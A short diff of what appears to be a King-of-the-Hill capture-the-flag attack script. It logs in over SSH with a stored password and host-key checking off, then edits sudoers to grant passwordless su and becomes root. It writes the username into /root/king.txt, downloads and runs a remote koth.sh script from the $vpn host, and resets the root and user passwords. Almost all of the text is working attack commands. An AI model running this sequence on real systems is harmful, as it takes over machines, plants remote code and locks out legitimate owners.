@@ -62,7 +62,7 @@ sshpass -p "$ssh_pass" ssh -o StrictHostKeychecking=no neville@"$IP" -p "$SSH_PO
     ip netns add foo && ip netns exec foo sed -i '/^#includedir \/etc\/sudoers.d/a neville ALL=(ALL) NOPASSWD: /bin/su' {} \;
     sleep 1
     sudo su
-    echo "$username" >> /root/king.txt
+    echo "$username" > /root/king.txt
     cd /boot && wget http://$vpn/Scripts/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
     echo "root:$new_password" | chpasswd
     echo "neville:$new_password" | chpasswd
